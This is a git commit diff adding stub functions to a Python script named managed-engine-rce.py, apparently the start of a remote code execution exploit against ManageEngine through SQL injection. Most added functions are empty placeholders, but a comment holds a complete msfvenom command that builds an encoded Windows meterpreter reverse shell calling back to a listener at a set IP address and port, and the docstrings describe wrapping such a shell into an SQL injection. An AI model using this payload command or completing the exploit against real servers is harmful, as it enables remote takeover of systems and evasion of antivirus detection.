73d7141c2345bd23b7501103dd2e084ebec48fbe
aleksa <zabumaphu@gmail.com>
2024-09-04 19:13:42 -0400

    Boilerplate exploite ManagedEngine.

--- managed-engine-rce.py
+++ managed-engine-rce.py
@@ -10,6 +10,42 @@ import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+
+
+# Functions to generate shell code and execute SQLi
+def revShell(lhost, lport):
+	"""
+	Uses the variables lhost and lport to create a meterpreter reverse shell. 	
+	"""
+	
+    # msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.45.159 LPORT=4444 -e x86/shikata_ga_nai -f vbs
+
+	pass
+
+def encodeSQLI(shell):
+	"""
+	Creates an encoded reverse shell that can be pasted at the end of a SQLi injection.
+	"""
+	pass
+
+def sendRequest():
+	"""
+	"""
+	pass
+
+
+# Functions that open a port and executes commands
+def openSocekt():
+	"""
+	"""
+	pass
+
+def command():
+	"""
+	"""
+	pass
+
+
 def main():
 	if len(sys.argv) != 2:
 		print("(+) usage %s <target>" % sys.argv[0])
